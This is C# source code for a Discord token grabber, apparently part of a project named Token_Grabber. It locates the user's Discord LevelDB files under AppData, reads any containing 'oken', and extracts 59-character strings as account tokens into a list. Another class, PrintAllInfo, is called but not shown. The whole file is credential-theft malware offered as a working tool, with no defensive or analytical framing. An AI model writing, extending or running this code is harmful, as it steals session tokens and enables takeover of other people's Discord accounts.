using System.Text.RegularExpressions;
using Token_Grabber;

public class Findtoken
{
    public static void Main()
    {
        new DiscordToken();
        new PrintAllInfo();

    }
}

/// <summary>
/// Get token from discord folder @AppData\discord\Local Storage\leveld (old method)
/// </summary>
public class DiscordToken
{

    public static List<string> matchs = new List<string>();
    public DiscordToken()
    {
        GetToken();
    }

    /// <summary>
    /// to extract the token text from ldb file using regex
    /// </summary>
    public static void GetToken()
    {
        var files = SearchForFile(); // to get ldb files
        if (files.Count == 0)
        {
            Environment.Exit(0);
            return;
        }
        foreach (string token in files)
        {
            foreach (Match match in Regex.Matches(token, "[^\"]*"))
            {
                if (match.Length == 59)
                {
                    
                    matchs.Add(match.ToString());
                    matchs.ToArray();
                }
            }
        }
    }

    /// <summary>
    /// check is discord path exists then add "*.ldb" files to list<string>
    /// </summary>
    /// <returns>string</returns>
    private static List<string> SearchForFile()
    {
        List<string> ldbFiles = new List<string>();
        string discordPath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Discord\\Local Storage\\leveldb\\";

        if (!Directory.Exists(discordPath))
        {
            Environment.Exit(0);
            return ldbFiles;
        }

        foreach (string file in Directory.GetFiles(discordPath, "*.ldb", SearchOption.TopDirectoryOnly))
        {
            string rawText = File.ReadAllText(file);
            if (rawText.Contains("oken"))
            {
                ldbFiles.Add(rawText);
            }
        }
        return ldbFiles;
    }
}
